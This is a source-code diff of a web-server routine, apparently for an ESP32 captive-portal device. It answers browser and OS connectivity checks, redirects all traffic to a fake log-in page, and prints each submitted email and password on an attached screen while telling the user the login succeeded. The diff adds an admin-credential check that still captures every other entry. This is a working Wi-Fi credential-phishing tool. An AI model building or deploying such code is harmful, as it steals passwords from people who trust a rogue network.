@@ -34,8 +34,15 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
 	server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });					   // firefox captive portal call home
 	server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });			   // windows call home
 
-	// return 404 to webpage icon
+	// Return 404 to webpage icon
 	server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });	// webpage icon
+
+  // // Server Admin Page (With HTTP Auth)
+  // server.on("/admin", HTTP_ANY, [](AsyncWebServerRequest *request) {
+  //   if(!request->authenticate(auser, apass))
+  //     return request->requestAuthentication();
+  //   request->send(200, "text/html", "<h1>Admin Login successful!</h1>");
+  // });
 
 	// Serve Basic HTML Page
 	server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
@@ -44,7 +51,7 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
 		Serial.println("Served log-in page");
 	});
 
-	// the catch all
+	// The Catch All
 	server.onNotFound([](AsyncWebServerRequest *request) {
 		request->redirect(localIPURL);
 		Serial.print("Redirected to " + localIPURL + "\n");
@@ -54,10 +61,14 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
     String email = request->getParam("email", true)->value();
     String password = request->getParam("password", true)->value();
 
-    tft.setCursor(0, 10);
-    tft.printf("%s : %s", email, password);
+    if (email == auser && password == apass) {
+      request->send(200, "text/html", "<h1>Admin Login successful!</h1>");
+    } else {
+      tft.setCursor(0, 10);
+      tft.printf("%s : %s", email, password);
 
-    request->send(200, "text/html", "<h1>Login successful!</h1>");
+      request->send(200, "text/html", "<h1>Login successful!</h1>");
+    }
   });
 }
 
